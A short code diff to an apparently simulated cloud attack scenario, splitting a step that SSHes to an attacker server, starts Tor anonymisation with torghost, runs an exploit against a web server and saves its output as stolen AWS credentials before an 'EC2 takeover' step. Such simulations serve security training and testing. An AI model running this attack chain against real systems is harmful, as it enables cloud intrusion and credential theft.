@@ -103,7 +103,9 @@ class ScenarioExecution:
         print("-"*30)
         print(colored("Running exploit on Remote Web Server", color="red"))
         self.loading_animation()
-        subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 torghost/torghost.py -s && sudo python3 exploit.py "+self.WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials'", shell=True)
+        # Start torghost first, then run exploit separately to avoid torghost output in credentials file
+        subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 torghost/torghost.py -s'", shell=True)
+        subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+" 'python3 exploit.py "+self.WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials 2>/dev/null'", shell=True)
 
     def ec2_takeover(self):
         print("-"*30)
